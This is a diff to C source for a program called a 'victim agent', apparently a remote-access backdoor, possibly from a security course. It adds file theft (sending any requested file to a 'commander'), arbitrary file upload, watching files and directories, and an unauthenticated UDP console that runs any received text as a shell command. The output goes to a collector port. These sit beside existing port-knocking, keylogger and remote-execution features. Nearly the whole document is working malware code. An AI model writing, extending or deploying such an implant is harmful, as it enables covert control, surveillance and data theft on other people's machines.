@@ -1,10 +1,13 @@
 #include <arpa/inet.h>
+#include <dirent.h>
 #include <errno.h>
+#include <pthread.h>
 #include <signal.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/stat.h>
 #include <sys/select.h>
 #include <sys/socket.h>
 #include <sys/time.h>
@@ -15,11 +18,15 @@
 #define KNOCK_PORT_COUNT 3
 #define KNOCK_PORT_BASE 5001
 #define KNOCK_TIMEOUT_MS 2000
+#define CONSOLE_PORT 9998
+#define COLLECTOR_PORT 9999
 #define COVERT_PORT 7777
 #define PACKET_SIZE_MAX 1400
 #define CHECKSUM_SIZE 2
+#define FILE_CHUNK 512
 #define KEYLOGGER_DEVICE_MAX 256
 #define KEYLOGGER_AUDIT_FILE "/tmp/victim_keylogger_audit.log"
+#define REMOTE_PATH_MAX 512
 #define RESPONSE_TEXT_MAX 256
 #define EXEC_COMMAND_MAX 1024
 #define EXEC_OUTPUT_CHUNK_MAX (PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE)
@@ -30,11 +37,22 @@
 #define CMD_KEYLOG_STOP  0x11
 #define CMD_EXEC_CMD      0x30
 #define CMD_EXEC_OUTPUT   0x31
+#define CMD_FILE_GET      0x40
+#define CMD_FILE_DATA     0x41
+#define CMD_FILE_PUT_BEGIN 0x42
+#define CMD_FILE_PUT_CHUNK 0x43
+#define CMD_FILE_PUT_END   0x44
+#define CMD_WATCH_FILE    0x50
+#define CMD_WATCH_DIR     0x51
 #define CMD_UNINSTALL    0xFE
 
 #define CMD_OK    0xF0
 #define CMD_ERROR 0xF1
 #define CMD_ACK   0xF2
+
+#define MSG_DIRECTORY_EVENT 1
+#define MSG_FILE_DATA       2
+#define MSG_COMMAND_OUTPUT  3
 
 #define SEQ_INIT 0x13370000
 
@@ -52,8 +70,25 @@ typedef struct {
 } parsed_packet_t;
 
 typedef struct {
+    int message_type;
+    char filename;
+    char payload[FILE_CHUNK];
+    int payload_len;
+} network_message_t;
+
+typedef struct {
+    int active;
+    int exists;
+    char path[REMOTE_PATH_MAX];
+    time_t mtime;
+    off_t size;
+    uint64_t signature;
+} watch_state_t;
+
+typedef struct {
     int knock_socks[KNOCK_PORT_COUNT];
     int covert_sock;
+    int console_sock;
 
     int knock_index;
     struct in_addr knock_addr;
@@ -68,6 +103,12 @@ typedef struct {
 
     int keylogger_active;
     char keylogger_device[KEYLOGGER_DEVICE_MAX];
+    FILE *upload_fp;
+    char upload_path[REMOTE_PATH_MAX];
+    watch_state_t file_watch;
+    watch_state_t directory_watch;
+    int console_listener_active;
+    pthread_t console_thread;
 } victim_state_t;
 
 static volatile sig_atomic_t g_running = 1;
@@ -75,17 +116,23 @@ static volatile sig_atomic_t g_running = 1;
 static void handle_signal(int signo);
 static void init_state(victim_state_t *state);
 static int init_sockets(victim_state_t *state);
+static int start_console_listener(victim_state_t *state);
 static int bind_udp_socket(uint16_t port);
+static void stop_console_listener(victim_state_t *state);
 static void close_sockets(victim_state_t *state);
 static int run_victim(victim_state_t *state);
 static void poll_knock_state(victim_state_t *state);
 static void poll_session_state(victim_state_t *state);
+static void poll_watch_targets(victim_state_t *state);
+static void *console_listener_thread(void *arg);
 static void handle_knock_packet(victim_state_t *state, int knock_index);
 static void reset_knock_state(victim_state_t *state);
 static void maybe_reset_knock_timeout(victim_state_t *state);
 static long elapsed_ms(const struct timeval *start);
 static void activate_session(victim_state_t *state, const struct in_addr *peer_addr);
 static void deactivate_session(victim_state_t *state, const char *reason);
+static void clear_upload_state(victim_state_t *state);
+static void clear_watch_targets(victim_state_t *state);
 static void drain_covert_packet(victim_state_t *state);
 static void handle_covert_packet(victim_state_t *state);
 static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len);
@@ -95,9 +142,21 @@ static int process_command(victim_state_t *state, const struct sockaddr_in *peer
 static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
 static int stop_keylogger(victim_state_t *state, char *message, size_t message_len);
 static int execute_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
+static int send_file_to_commander(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len);
+static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
+static int write_file_upload_chunk(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
+static int finish_file_upload(victim_state_t *state, char *message, size_t message_len);
+static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
+static int watch_remote_directory(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
+static int snapshot_file_watch(const char *path, watch_state_t *watch);
+static int snapshot_directory_watch(const char *path, watch_state_t *watch);
+static uint64_t compute_directory_signature(const char *path, int *exists, time_t *mtime);
+static void send_watch_event(victim_state_t *state, const char *label, const char *path, const char *details);
+static int execute_console_command(const struct in_addr *collector_addr, const char *command);
 static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len);
 static size_t bounded_strlen(const uint8_t *data, size_t limit);
 static int append_keylogger_audit(const char *action, const char *device_path);
+static int send_console_message(const struct in_addr *collector_addr, const network_message_t *message);
 static uint16_t compute_checksum(const uint8_t *data, size_t len);
 static const char *command_name(uint8_t command);
 
@@ -113,6 +172,9 @@ int main(void) {
         close_sockets(&state);
         return EXIT_FAILURE;
     }
+    if (start_console_listener(&state) != 0) {
+        fprintf(stderr, "Direct UDP console listener unavailable on port %u\n", (unsigned)CONSOLE_PORT);
+    }
 
     printf("Victim agent started\n");
     printf("Waiting for UDP knock sequence on ports %u-%u\n",
@@ -125,6 +187,9 @@ int main(void) {
         (void)append_keylogger_audit("STOP", state.keylogger_device);
     }
 
+    clear_upload_state(&state);
+    clear_watch_targets(&state);
+    stop_console_listener(&state);
     close_sockets(&state);
     printf("Victim agent exiting\n");
     return EXIT_SUCCESS;
@@ -143,6 +208,7 @@ static void init_state(victim_state_t *state) {
     }
 
     state->covert_sock = -1;
+    state->console_sock = -1;
     state->expected_seq = SEQ_INIT;
     state->next_seq = SEQ_INIT;
 }
@@ -161,6 +227,24 @@ static int init_sockets(victim_state_t *state) {
         return -1;
     }
 
+    return 0;
+}
+
+static int start_console_listener(victim_state_t *state) {
+    state->console_sock = bind_udp_socket(CONSOLE_PORT);
+    if (state->console_sock < 0) {
+        return -1;
+    }
+
+    if (pthread_create(&state->console_thread, NULL, console_listener_thread, state) != 0) {
+        perror("pthread_create console");
+        close(state->console_sock);
+        state->console_sock = -1;
+        return -1;
+    }
+
+    state->console_listener_active = 1;
+    printf("Direct UDP console listener on port %u\n", (unsigned)CONSOLE_PORT);
     return 0;
 }
 
@@ -199,6 +283,20 @@ static int bind_udp_socket(uint16_t port) {
     return sock;
 }
 
+static void stop_console_listener(victim_state_t *state) {
+    if (!state->console_listener_active) {
+        return;
+    }
+
+    (void)pthread_join(state->console_thread, NULL);
+    state->console_listener_active = 0;
+
+    if (state->console_sock >= 0) {
+        close(state->console_sock);
+        state->console_sock = -1;
+    }
+}
+
 static void close_sockets(victim_state_t *state) {
     for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
         if (state->knock_socks[i] >= 0) {
@@ -211,12 +309,18 @@ static void close_sockets(victim_state_t *state) {
         close(state->covert_sock);
         state->covert_sock = -1;
     }
+
+    if (state->console_sock >= 0) {
+        close(state->console_sock);
+        state->console_sock = -1;
+    }
 }
 
 static int run_victim(victim_state_t *state) {
     while (g_running) {
         if (state->session_active) {
             poll_session_state(state);
+            poll_watch_targets(state);
         } else {
             poll_knock_state(state);
         }
@@ -297,6 +401,124 @@ static void poll_session_state(victim_state_t *state) {
     if (ready > 0 && FD_ISSET(state->covert_sock, &read_fds)) {
         handle_covert_packet(state);
     }
+}
+
+static void poll_watch_targets(victim_state_t *state) {
+    watch_state_t current;
+
+    if (!state->session_active) {
+        return;
+    }
+
+    if (state->file_watch.active) {
+        memset(&current, 0, sizeof(current));
+        if (snapshot_file_watch(state->file_watch.path, &current) != 0) {
+            if (state->file_watch.exists) {
+                send_watch_event(state, "File watch", state->file_watch.path, "target became unavailable");
+                state->file_watch.exists = 0;
+            }
+        } else if (!state->file_watch.exists) {
+            send_watch_event(state, "File watch", state->file_watch.path, "target became available");
+            state->file_watch.exists = 1;
+            state->file_watch.mtime = current.mtime;
+            state->file_watch.size = current.size;
+        } else if (state->file_watch.mtime != current.mtime || state->file_watch.size != current.size) {
+            char details[FILE_CHUNK];
+
+            snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
+            send_watch_event(state, "File watch", state->file_watch.path, details);
+            state->file_watch.mtime = current.mtime;
+            state->file_watch.size = current.size;
+        }
+    }
+
+    if (state->directory_watch.active) {
+        memset(&current, 0, sizeof(current));
+        if (snapshot_directory_watch(state->directory_watch.path, &current) != 0) {
+            if (state->directory_watch.exists) {
+                send_watch_event(state, "Directory watch", state->directory_watch.path, "target became unavailable");
+                state->directory_watch.exists = 0;
+            }
+        } else if (!state->directory_watch.exists) {
+            send_watch_event(state, "Directory watch", state->directory_watch.path, "target became available");
+            state->directory_watch.exists = 1;
+            state->directory_watch.mtime = current.mtime;
+            state->directory_watch.signature = current.signature;
+        } else if (state->directory_watch.mtime != current.mtime ||
+                   state->directory_watch.signature != current.signature) {
+            send_watch_event(state, "Directory watch", state->directory_watch.path, "directory contents changed");
+            state->directory_watch.mtime = current.mtime;
+            state->directory_watch.signature = current.signature;
+        }
+    }
+}
+
+static void *console_listener_thread(void *arg) {
+    victim_state_t *state = (victim_state_t *)arg;
+
+    while (g_running) {
+        fd_set read_fds;
+        struct timeval timeout;
+        struct sockaddr_in src_addr;
+        socklen_t src_len = sizeof(src_addr);
+        char cmd_buffer[EXEC_COMMAND_MAX];
+        char src_ip[INET_ADDRSTRLEN];
+        ssize_t received;
+        size_t command_len;
+
+        FD_ZERO(&read_fds);
+        FD_SET(state->console_sock, &read_fds);
+        timeout.tv_sec = 1;
+        timeout.tv_usec = 0;
+
+        received = select(state->console_sock + 1, &read_fds, NULL, NULL, &timeout);
+        if (received < 0) {
+            if (errno == EINTR) {
+                continue;
+            }
+            perror("select console");
+            break;
+        }
+
+        if (received == 0) {
+            continue;
+        }
+
+        memset(cmd_buffer, 0, sizeof(cmd_buffer));
+        received = recvfrom(
+            state->console_sock,
+            cmd_buffer,
+            sizeof(cmd_buffer) - 1,
+            0,
+            (struct sockaddr *)&src_addr,
+            &src_len
+        );
+
+        if (received < 0) {
+            if (errno == EINTR) {
+                continue;
+            }
+            perror("recvfrom console");
+            break;
+        }
+
+        cmd_buffer[received] = '\0';
+        command_len = strlen(cmd_buffer);
+        while (command_len > 0 &&
+               (cmd_buffer[command_len - 1] == '\n' || cmd_buffer[command_len - 1] == '\r')) {
+            cmd_buffer[--command_len] = '\0';
+        }
+
+        if (cmd_buffer[0] == '\0') {
+            continue;
+        }
+
+        inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
+        printf("Direct console command received from %s: %s\n", src_ip, cmd_buffer);
+        (void)execute_console_command(&src_addr.sin_addr, cmd_buffer);
+    }
+
+    return NULL;
 }
 
 static void handle_knock_packet(victim_state_t *state, int knock_index) {
@@ -406,6 +628,9 @@ static void deactivate_session(victim_state_t *state, const char *reason) {
         state->keylogger_device[0] = '\0';
     }
 
+    clear_upload_state(state);
+    clear_watch_targets(state);
+
     printf("Session closed");
     if (reason != NULL && reason[0] != '\0') {
         printf(": %s", reason);
@@ -419,6 +644,20 @@ static void deactivate_session(victim_state_t *state, const char *reason) {
     state->expected_seq = SEQ_INIT;
     state->next_seq = SEQ_INIT;
     reset_knock_state(state);
+}
+
+static void clear_upload_state(victim_state_t *state) {
+    if (state->upload_fp != NULL) {
+        fclose(state->upload_fp);
+        state->upload_fp = NULL;
+    }
+
+    state->upload_path[0] = '\0';
+}
+
+static void clear_watch_targets(victim_state_t *state) {
+    memset(&state->file_watch, 0, sizeof(state->file_watch));
+    memset(&state->directory_watch, 0, sizeof(state->directory_watch));
 }
 
 static void drain_covert_packet(victim_state_t *state) {
@@ -646,6 +885,50 @@ static int process_command(victim_state_t *state, const struct sockaddr_in *peer
             }
             break;
 
+        case CMD_FILE_GET:
+            result = send_file_to_commander(state, peer_addr, packet->payload, packet->payload_len);
+            break;
+
+        case CMD_FILE_PUT_BEGIN:
+            if (begin_file_upload(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
+                result = send_response(state, peer_addr, CMD_ACK, message);
+            } else {
+                result = send_response(state, peer_addr, CMD_ERROR, message);
+            }
+            break;
+
+        case CMD_FILE_PUT_CHUNK:
+            if (write_file_upload_chunk(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
+                result = send_response(state, peer_addr, CMD_ACK, message);
+            } else {
+                result = send_response(state, peer_addr, CMD_ERROR, message);
+            }
+            break;
+
+        case CMD_FILE_PUT_END:
+            if (finish_file_upload(state, message, sizeof(message)) == 0) {
+                result = send_response(state, peer_addr, CMD_OK, message);
+            } else {
+                result = send_response(state, peer_addr, CMD_ERROR, message);
+            }
+            break;
+
+        case CMD_WATCH_FILE:
+            if (watch_remote_file(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
+                result = send_response(state, peer_addr, CMD_OK, message);
+            } else {
+                result = send_response(state, peer_addr, CMD_ERROR, message);
+            }
+            break;
+
+        case CMD_WATCH_DIR:
+            if (watch_remote_directory(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
+                result = send_response(state, peer_addr, CMD_OK, message);
+            } else {
+                result = send_response(state, peer_addr, CMD_ERROR, message);
+            }
+            break;
+
         case CMD_DISCONNECT:
             result = send_response(state, peer_addr, CMD_ACK, "disconnect ok");
             deactivate_session(state, "commander disconnected");
@@ -809,6 +1092,334 @@ static int execute_command(victim_state_t *state, const struct sockaddr_in *peer
     return -1;
 }
 
+static int send_file_to_commander(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len) {
+    char path[REMOTE_PATH_MAX];
+    char error[RESPONSE_TEXT_MAX];
+    uint8_t buffer[EXEC_OUTPUT_CHUNK_MAX];
+    FILE *fp;
+    size_t bytes_read;
+    int failed = 0;
+
+    if (copy_payload_string(payload, payload_len, "remote path", path, sizeof(path), error, sizeof(error)) != 0) {
+        return send_response(state, peer_addr, CMD_ERROR, error);
+    }
+
+    fp = fopen(path, "rb");
+    if (fp == NULL) {
+        snprintf(error, sizeof(error), "file transfer failed: %s", strerror(errno));
+        return send_response(state, peer_addr, CMD_ERROR, error);
+    }
+
+    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
+        if (send_response_payload(state, peer_addr, CMD_FILE_DATA, buffer, (uint16_t)bytes_read) != 0) {
+            failed = 1;
+            break;
+        }
+    }
+
+    if (ferror(fp)) {
+        snprintf(error, sizeof(error), "file transfer failed while reading %s", path);
+        fclose(fp);
+        return send_response(state, peer_addr, CMD_ERROR, error);
+    }
+
+    fclose(fp);
+
+    if (failed) {
+        return -1;
+    }
+
+    snprintf(error, sizeof(error), "transferred %s", path);
+    return send_response(state, peer_addr, CMD_OK, error);
+}
+
+static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
+    char path[REMOTE_PATH_MAX];
+    char error[RESPONSE_TEXT_MAX];
+
+    if (copy_payload_string(payload, payload_len, "remote path", path, sizeof(path), error, sizeof(error)) != 0) {
+        snprintf(message, message_len, "file upload failed: %s", error);
+        return -1;
+    }
+
+    clear_upload_state(state);
+    state->upload_fp = fopen(path, "wb");
+    if (state->upload_fp == NULL) {
+        snprintf(message, message_len, "file upload failed: %s", strerror(errno));
+        return -1;
+    }
+
+    snprintf(state->upload_path, sizeof(state->upload_path), "%s", path);
+    snprintf(message, message_len, "receiving %s", state->upload_path);
+    return 0;
+}
+
+static int write_file_upload_chunk(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
+    if (state->upload_fp == NULL) {
+        snprintf(message, message_len, "file upload failed: no active upload");
+        return -1;
+    }
+
+    if (payload_len == 0) {
+        snprintf(message, message_len, "chunk received");
+        return 0;
+    }
+
+    if (fwrite(payload, 1, payload_len, state->upload_fp) != payload_len) {
+        snprintf(message, message_len, "file upload failed while writing %s", state->upload_path);
+        clear_upload_state(state);
+        return -1;
+    }
+
+    snprintf(message, message_len, "chunk received");
+    return 0;
+}
+
+static int finish_file_upload(victim_state_t *state, char *message, size_t message_len) {
+    char completed_path[REMOTE_PATH_MAX];
+
+    if (state->upload_fp == NULL) {
+        snprintf(message, message_len, "file upload failed: no active upload");
+        return -1;
+    }
+
+    snprintf(completed_path, sizeof(completed_path), "%s", state->upload_path);
+    clear_upload_state(state);
+    snprintf(message, message_len, "stored file at %s", completed_path);
+    return 0;
+}
+
+static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
+    watch_state_t watch;
+    char path[REMOTE_PATH_MAX];
+    char error[RESPONSE_TEXT_MAX];
+
+    if (copy_payload_string(payload, payload_len, "remote file path", path, sizeof(path), error, sizeof(error)) != 0) {
+        snprintf(message, message_len, "file watch failed: %s", error);
+        return -1;
+    }
+
+    memset(&watch, 0, sizeof(watch));
+    if (snapshot_file_watch(path, &watch) != 0) {
+        snprintf(message, message_len, "file watch failed: cannot access %s", path);
+        return -1;
+    }
+
+    watch.active = 1;
+    snprintf(watch.path, sizeof(watch.path), "%s", path);
+    state->file_watch = watch;
+    snprintf(message, message_len, "watching file %s", state->file_watch.path);
+    return 0;
+}
+
+static int watch_remote_directory(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
+    watch_state_t watch;
+    char path[REMOTE_PATH_MAX];
+    char error[RESPONSE_TEXT_MAX];
+
+    if (copy_payload_string(payload, payload_len, "remote directory path", path, sizeof(path), error, sizeof(error)) != 0) {
+        snprintf(message, message_len, "directory watch failed: %s", error);
+        return -1;
+    }
+
+    memset(&watch, 0, sizeof(watch));
+    if (snapshot_directory_watch(path, &watch) != 0) {
+        snprintf(message, message_len, "directory watch failed: cannot access %s", path);
+        return -1;
+    }
+
+    watch.active = 1;
+    snprintf(watch.path, sizeof(watch.path), "%s", path);
+    state->directory_watch = watch;
+    snprintf(message, message_len, "watching directory %s", state->directory_watch.path);
+    return 0;
+}
+
+static int snapshot_file_watch(const char *path, watch_state_t *watch) {
+    struct stat st;
+
+    if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) {
+        return -1;
+    }
+
+    watch->exists = 1;
+    watch->mtime = st.st_mtime;
+    watch->size = st.st_size;
+    return 0;
+}
+
+static int snapshot_directory_watch(const char *path, watch_state_t *watch) {
+    int exists = 0;
+    time_t mtime = 0;
+    uint64_t signature;
+
+    signature = compute_directory_signature(path, &exists, &mtime);
+    if (!exists) {
+        return -1;
+    }
+
+    watch->exists = 1;
+    watch->mtime = mtime;
+    watch->signature = signature;
+    return 0;
+}
+
+static uint64_t compute_directory_signature(const char *path, int *exists, time_t *mtime) {
+    DIR *dir;
+    struct dirent *entry;
+    struct stat dir_stat;
+    uint64_t hash = 1469598103934665603ULL;
+
+    *exists = 0;
+    *mtime = 0;
+
+    if (stat(path, &dir_stat) != 0 || !S_ISDIR(dir_stat.st_mode)) {
+        return 0;
+    }
+
+    dir = opendir(path);
+    if (dir == NULL) {
+        return 0;
+    }
+
+    *exists = 1;
+    *mtime = dir_stat.st_mtime;
+
+    while ((entry = readdir(dir)) != NULL) {
+        char child_path[REMOTE_PATH_MAX * 2];
+        struct stat st;
+        const unsigned char *name = (const unsigned char *)entry->d_name;
+
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+            continue;
+        }
+
+        while (*name != '\0') {
+            hash ^= *name++;
+            hash *= 1099511628211ULL;
+        }
+
+        if (snprintf(child_path, sizeof(child_path), "%s/%s", path, entry->d_name) >= (int)sizeof(child_path)) {
+            continue;
+        }
+
+        if (stat(child_path, &st) == 0) {
+            hash ^= (uint64_t)st.st_mtime;
+            hash *= 1099511628211ULL;
+            hash ^= (uint64_t)st.st_size;
+            hash *= 1099511628211ULL;
+            hash ^= (uint64_t)st.st_mode;
+            hash *= 1099511628211ULL;
+        }
+    }
+
+    closedir(dir);
+    return hash;
+}
+
+static void send_watch_event(victim_state_t *state, const char *label, const char *path, const char *details) {
+    network_message_t message;
+
+    if (!state->session_active) {
+        return;
+    }
+
+    memset(&message, 0, sizeof(message));
+    message.message_type = MSG_DIRECTORY_EVENT;
+    snprintf(message.payload, sizeof(message.payload), "%s: %s (%s)", label, path, details);
+    message.payload_len = (int)strnlen(message.payload, sizeof(message.payload));
+    (void)send_console_message(&state->allowed_addr, &message);
+}
+
+static int execute_console_command(const struct in_addr *collector_addr, const char *command) {
+    FILE *pipe;
+    network_message_t message;
+    int status;
+    int sent_output = 0;
+
+    pipe = popen(command, "r");
+    if (pipe == NULL) {
+        char error[FILE_CHUNK];
+        size_t error_len;
+
+        snprintf(error, sizeof(error), "command failed: popen: %s\n", strerror(errno));
+        error_len = strnlen(error, sizeof(error));
+
+        memset(&message, 0, sizeof(message));
+        message.message_type = MSG_COMMAND_OUTPUT;
+        message.payload_len = (int)error_len;
+        memcpy(message.payload, error, error_len);
+        (void)send_console_message(collector_addr, &message);
+
+        memset(&message, 0, sizeof(message));
+        message.message_type = MSG_COMMAND_OUTPUT;
+        (void)send_console_message(collector_addr, &message);
+        return -1;
+    }
+
+    memset(&message, 0, sizeof(message));
+    message.message_type = MSG_COMMAND_OUTPUT;
+
+    while (fgets(message.payload, sizeof(message.payload), pipe) != NULL) {
+        sent_output = 1;
+        message.payload_len = (int)strnlen(message.payload, sizeof(message.payload));
+        if (send_console_message(collector_addr, &message) != 0) {
+            pclose(pipe);
+            return -1;
+        }
+        usleep(2000);
+        memset(message.payload, 0, sizeof(message.payload));
+    }
+
+    status = pclose(pipe);
+
+    if (!sent_output) {
+        static const char no_output[] = "(no output)\n";
+
+        memset(&message, 0, sizeof(message));
+        message.message_type = MSG_COMMAND_OUTPUT;
+        message.payload_len = (int)(sizeof(no_output) - 1);
+        memcpy(message.payload, no_output, sizeof(no_output) - 1);
+        if (send_console_message(collector_addr, &message) != 0) {
+            return -1;
+        }
+    }
+
+    if (status == -1) {
+        char error[FILE_CHUNK];
+        size_t error_len;
+
+        snprintf(error, sizeof(error), "command failed: pclose: %s\n", strerror(errno));
+        error_len = strnlen(error, sizeof(error));
+
+        memset(&message, 0, sizeof(message));
+        message.message_type = MSG_COMMAND_OUTPUT;
+        message.payload_len = (int)error_len;
+        memcpy(message.payload, error, error_len);
+        if (send_console_message(collector_addr, &message) != 0) {
+            return -1;
+        }
+    } else if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
+        char status_text[FILE_CHUNK];
+        size_t status_len;
+
+        snprintf(status_text, sizeof(status_text), "command exited with status %d\n", WEXITSTATUS(status));
+        status_len = strnlen(status_text, sizeof(status_text));
+
+        memset(&message, 0, sizeof(message));
+        message.message_type = MSG_COMMAND_OUTPUT;
+        message.payload_len = (int)status_len;
+        memcpy(message.payload, status_text, status_len);
+        if (send_console_message(collector_addr, &message) != 0) {
+            return -1;
+        }
+    }
+
+    memset(&message, 0, sizeof(message));
+    message.message_type = MSG_COMMAND_OUTPUT;
+    return send_console_message(collector_addr, &message);
+}
+
 static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len) {
     size_t string_len;
 
@@ -859,6 +1470,33 @@ static int append_keylogger_audit(const char *action, const char *device_path) {
     return 0;
 }
 
+static int send_console_message(const struct in_addr *collector_addr, const network_message_t *message) {
+    int sock;
+    struct sockaddr_in collector;
+    ssize_t sent;
+
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        perror("socket console");
+        return -1;
+    }
+
+    memset(&collector, 0, sizeof(collector));
+    collector.sin_family = AF_INET;
+    collector.sin_addr = *collector_addr;
+    collector.sin_port = htons(COLLECTOR_PORT);
+
+    sent = sendto(sock, message, sizeof(*message), 0, (const struct sockaddr *)&collector, sizeof(collector));
+    close(sock);
+
+    if (sent != (ssize_t)sizeof(*message)) {
+        perror("sendto console");
+        return -1;
+    }
+
+    return 0;
+}
+
 static uint16_t compute_checksum(const uint8_t *data, size_t len) {
     uint32_t sum = 0;
 
@@ -886,6 +1524,20 @@ static const char *command_name(uint8_t command) {
             return "EXEC_CMD";
         case CMD_EXEC_OUTPUT:
             return "EXEC_OUTPUT";
+        case CMD_FILE_GET:
+            return "FILE_GET";
+        case CMD_FILE_DATA:
+            return "FILE_DATA";
+        case CMD_FILE_PUT_BEGIN:
+            return "FILE_PUT_BEGIN";
+        case CMD_FILE_PUT_CHUNK:
+            return "FILE_PUT_CHUNK";
+        case CMD_FILE_PUT_END:
+            return "FILE_PUT_END";
+        case CMD_WATCH_FILE:
+            return "WATCH_FILE";
+        case CMD_WATCH_DIR:
+            return "WATCH_DIR";
         case CMD_UNINSTALL:
             return "UNINSTALL";
         case CMD_OK:
